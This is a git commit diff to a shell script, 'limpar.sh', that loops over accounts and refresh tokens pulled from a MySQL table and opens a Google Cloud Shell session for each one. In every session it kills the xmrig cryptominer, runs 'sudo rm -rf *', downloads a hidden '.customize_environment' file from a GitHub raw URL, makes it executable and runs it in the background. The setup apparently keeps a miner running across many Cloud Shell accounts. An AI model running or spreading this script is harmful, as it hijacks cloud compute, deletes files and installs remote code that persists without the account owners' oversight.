725005815839e015b290bc1677fd8db293df8abe
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-08 16:50:28 -0300

    Update limpar.sh

--- limpar.sh
+++ limpar.sh
@@ -3,8 +3,13 @@
 while read account refresh_token
 do
 
-command="sudo pkill xmrig ; sudo pkill ping.sh ; sudo rm -rf * ; sudo rm -rf .customize_environment ; ls -a ;  wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & "
+echo
+echo $account
+
+command="echo 'ok' ; sudo pkill xmrig ; sudo pkill ping.sh ; sudo rm -rf * ; sudo rm -rf .customize_environment ; wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null &"
 
 gcloud cloud-shell ssh --account=$account --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet
 
-done < <(echo "select account , refresh_token from tbl_account " | mysql --login-path=$home/config.cnf fenix -s)
+sleep 1
+
+done < <(echo "select account , refresh_token from tbl_account" | mysql --login-path=$home/config.cnf fenix -s)
